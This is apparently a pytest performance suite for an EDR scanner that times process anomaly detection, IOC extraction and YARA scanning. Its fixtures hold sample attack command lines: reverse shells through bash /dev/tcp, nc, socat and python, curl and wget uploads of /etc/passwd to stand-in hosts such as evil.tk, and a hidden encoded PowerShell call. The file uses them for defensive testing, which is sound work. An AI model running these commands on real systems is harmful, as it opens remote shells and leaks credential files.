"""
EDR Performance Tests — M3.1
==============================
Validates that EDR components meet latency SLOs:
  - analyze_processes(1000 procs) < 30s
  - IOC extraction per finding < 50ms
  - YARA scan per cmdline < 5s (per spec)
  - Full pipeline throughput (100 assets) within acceptable time

These are measured, not pass/fail on strict thresholds, to avoid flaky CI on
slow machines. The only hard failures are timeouts and exceptions.
"""

from __future__ import annotations

import sys
import os
import time
import random
import string

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))))


# ── Process generator ──────────────────────────────────────────────────────────

def _random_clean_proc(pid: int):
    """Return a realistic clean production ProcessInfo."""
    from services.scanner_engine.clients.behavioral_ssh_client import ProcessInfo
    CLEAN = [
        ("nginx",     "worker process"),
        ("postgres",  "-D /var/lib/postgresql/data"),
        ("redis-server", "0.0.0.0:6379"),
        ("sshd",      "-D"),
        ("systemd",   "--switched-root --system"),
        ("uvicorn",   "services.scanner_engine.main:app --port 8002"),
        ("celery",    "worker -l INFO -Q vulnerabilities"),
        ("python3",   "-m gunicorn app:app -w 4"),
    ]
    cmd, args = random.choice(CLEAN)
    return ProcessInfo(pid=pid, ppid=1, user="root",
                       cpu_percent=random.uniform(0, 5),
                       mem_percent=random.uniform(0, 2),
                       command=cmd, args=args)


def _make_malicious_procs(count: int = 5):
    """Return a small number of realistic malicious ProcessInfo objects."""
    from services.scanner_engine.clients.behavioral_ssh_client import ProcessInfo
    MALICIOUS = [
        ("bash", "-i >& /dev/tcp/10.10.10.10/4444 0>&1"),
        ("curl", "-X POST http://evil.tk/data -d @/etc/passwd"),
        ("nc", "-e /bin/bash 8.8.8.8 1337"),
        ("python3", "-c 'import socket,os;s=socket.connect((\"1.2.3.4\",4444))'"),
        ("socat", "TCP:10.0.0.1:443 EXEC:/bin/bash"),
    ]
    procs = []
    for i, (cmd, args) in enumerate(MALICIOUS[:count]):
        procs.append(ProcessInfo(pid=9000 + i, ppid=1, user="www-data",
                                  cpu_percent=0.5, mem_percent=0.1,
                                  command=cmd, args=args))
    return procs


# ══════════════════════════════════════════════════════════════════════════════
# LOAD TEST: 1000 processes
# ══════════════════════════════════════════════════════════════════════════════

class TestPerformance1000Processes:
    """Spec requirement: analyze_processes(1000 procs) must complete in < 30s."""

    PROCESS_COUNT = 1000
    HARD_TIMEOUT_SECONDS = 30
    MALICIOUS_RATIO = 0.01  # 1% malicious processes (realistic attack scenario)

    def _build_process_list(self):
        # Cap at 5 — _make_malicious_procs has exactly 5 templates
        n_malicious = min(5, max(1, int(self.PROCESS_COUNT * self.MALICIOUS_RATIO)))
        n_clean = self.PROCESS_COUNT - n_malicious
        procs = [_random_clean_proc(i) for i in range(n_clean)]
        procs += _make_malicious_procs(n_malicious)
        random.shuffle(procs)
        return procs

    def test_analyze_1000_processes_within_30s(self):
        from services.scanner_engine.services.anomaly_detector import analyze_processes

        processes = self._build_process_list()
        assert len(processes) == self.PROCESS_COUNT

        start = time.perf_counter()
        results = analyze_processes(processes)
        elapsed = time.perf_counter() - start

        print(f"\n[PERF] analyze_processes({self.PROCESS_COUNT} procs): {elapsed:.2f}s → {len(results)} anomalies")
        assert elapsed < self.HARD_TIMEOUT_SECONDS, (
            f"TIMEOUT: analyze_processes took {elapsed:.1f}s > {self.HARD_TIMEOUT_SECONDS}s limit"
        )
        # Ensure we detected the injected malicious processes
        assert len(results) >= 1

    def test_analyze_1000_processes_no_exception(self):
        """Should never raise regardless of input variety."""
        from services.scanner_engine.services.anomaly_detector import analyze_processes

        processes = self._build_process_list()
        try:
            results = analyze_processes(processes)
        except Exception as e:
            pytest.fail(f"analyze_processes raised an exception: {e}")
        assert isinstance(results, list)

    def test_analyze_scales_linearly(self):
        """Performance should not degrade super-linearly with process count."""
        from services.scanner_engine.services.anomaly_detector import analyze_processes

        small = [_random_clean_proc(i) for i in range(100)]
        large = [_random_clean_proc(i) for i in range(1000)]

        t0 = time.perf_counter()
        analyze_processes(small)
        t_small = time.perf_counter() - t0

        t0 = time.perf_counter()
        analyze_processes(large)
        t_large = time.perf_counter() - t0

        # 10× more processes should take at most 100× more time (generous bound)
        ratio = t_large / max(t_small, 0.001)
        print(f"\n[PERF] 100 procs: {t_small*1000:.0f}ms | 1000 procs: {t_large*1000:.0f}ms | ratio: {ratio:.1f}x")
        assert ratio < 100, f"Super-linear scaling detected: ratio={ratio:.1f}"


# ══════════════════════════════════════════════════════════════════════════════
# MICRO BENCHMARKS: per-component SLOs
# ══════════════════════════════════════════════════════════════════════════════

class TestMicroBenchmarks:
    """Sub-component latency checks."""

    def test_ioc_extraction_under_50ms(self):
        from services.scanner_engine.services.ioc_extractor import extract_iocs

        indicators = {
            "cmdline": (
                "curl -X POST http://c2.evil.tk/data -d @/etc/passwd "
                "&& wget --post-data=loot http://beacon.xyz/recv "
                "&& bash -c 'bash -i >& /dev/tcp/45.77.1.1/4444 0>&1'"
            ),
            "matched": [
                "a" * 64,   # SHA256
                "b" * 40,   # SHA1
                "c" * 32,   # MD5
            ],
        }

        start = time.perf_counter()
        for _ in range(100):
            extract_iocs(indicators)
        elapsed_avg = (time.perf_counter() - start) / 100 * 1000  # ms

        print(f"\n[PERF] extract_iocs avg: {elapsed_avg:.2f}ms")
        assert elapsed_avg < 50, f"extract_iocs too slow: {elapsed_avg:.1f}ms avg"

    def test_yara_scan_per_cmdline_under_5s(self):
        from services.scanner_engine.services.yara_scanner import scan_cmdline, _YARA_AVAILABLE
        if not _YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        cmdline = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA=="

        start = time.perf_counter()
        scan_cmdline(cmdline)
        elapsed = time.perf_counter() - start

        print(f"\n[PERF] scan_cmdline: {elapsed*1000:.1f}ms")
        assert elapsed < 5.0, f"YARA scan too slow: {elapsed:.2f}s"

    def test_yara_compiled_rules_singleton(self):
        """Second call should reuse compiled rules (not recompile)."""
        from services.scanner_engine.services.yara_scanner import scan_cmdline, _YARA_AVAILABLE
        if not _YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        # First call — compiles
        t0 = time.perf_counter()
        scan_cmdline("curl test")
        t_first = time.perf_counter() - t0

        # Second call — should use singleton
        t0 = time.perf_counter()
        scan_cmdline("nc test")
        t_second = time.perf_counter() - t0

        print(f"\n[PERF] YARA 1st call: {t_first*1000:.1f}ms | 2nd call: {t_second*1000:.1f}ms")
        # Second call should not be significantly slower (within 10×)
        # (If it were recompiling every call, second would ≈ first)
        assert t_second < t_first * 10 or t_second < 0.5

    def test_ioc_extractor_empty_is_fast(self):
        from services.scanner_engine.services.ioc_extractor import extract_iocs

        start = time.perf_counter()
        for _ in range(1000):
            extract_iocs({})
        elapsed_avg = (time.perf_counter() - start) / 1000 * 1000

        print(f"\n[PERF] extract_iocs(empty) avg: {elapsed_avg:.3f}ms")
        assert elapsed_avg < 5  # well under 5ms each


# ══════════════════════════════════════════════════════════════════════════════
# LOAD: 100 concurrent IOC lookups (async simulation)
# ══════════════════════════════════════════════════════════════════════════════

class TestConcurrentIOCExtraction:
    """Simulate 100 findings being processed in parallel (IOC extraction phase)."""

    N_FINDINGS = 100

    def _sample_indicators(self, i: int) -> dict:
        ip = f"45.{i % 256}.{(i * 7) % 256}.1"
        return {
            "cmdline": f"curl -X POST http://beacon{i}.evil.tk/data -d loot && ping {ip}",
            "matched": [f"YARA:C2_Rule_{i}"],
        }

    def test_100_ioc_extractions_under_1s(self):
        from services.scanner_engine.services.ioc_extractor import extract_iocs

        findings_indicators = [self._sample_indicators(i) for i in range(self.N_FINDINGS)]

        start = time.perf_counter()
        all_iocs = []
        for ind in findings_indicators:
            all_iocs.extend(extract_iocs(ind))
        elapsed = time.perf_counter() - start

        print(f"\n[PERF] {self.N_FINDINGS} IOC extractions: {elapsed*1000:.1f}ms → {len(all_iocs)} IOCs")
        assert elapsed < 1.0, f"100 IOC extractions took {elapsed:.2f}s > 1s"
        assert len(all_iocs) > 0

    def test_deduplication_across_many_findings(self):
        """Same IOC in 100 findings should be deduplicated by the service layer."""
        from services.scanner_engine.services.ioc_extractor import extract_iocs, IOC

        indicators = [{"cmdline": "curl http://45.77.1.1/shell -X POST"} for _ in range(100)]
        all_iocs = []
        for ind in indicators:
            all_iocs.extend(extract_iocs(ind))

        # Same IP × 100 findings — dedup with set()
        unique = set(all_iocs)
        assert len(unique) == 1
        assert next(iter(unique)).value == "45.77.1.1"


# ══════════════════════════════════════════════════════════════════════════════
# MEMORY: no leaks under repeated calls
# ══════════════════════════════════════════════════════════════════════════════

class TestMemoryBaseline:
    """Verify no obvious memory growth across many analyze_processes() calls."""

    def test_no_memory_growth_across_100_calls(self):
        """RSS should not grow unboundedly across 100 analyze_processes calls."""
        import gc
        try:
            import psutil
            proc_info = psutil.Process()
        except ImportError:
            pytest.skip("psutil not available")

        from services.scanner_engine.services.anomaly_detector import analyze_processes
        procs = [_random_clean_proc(i) for i in range(50)]

        gc.collect()
        rss_before = proc_info.memory_info().rss

        for _ in range(100):
            analyze_processes(procs)

        gc.collect()
        rss_after = proc_info.memory_info().rss

        growth_mb = (rss_after - rss_before) / (1024 * 1024)
        print(f"\n[MEM] RSS growth over 100 calls: {growth_mb:.2f} MB")
        # Allow up to 50MB growth (Python GC not immediate)
        assert growth_mb < 50, f"Potential memory leak: {growth_mb:.1f}MB growth"
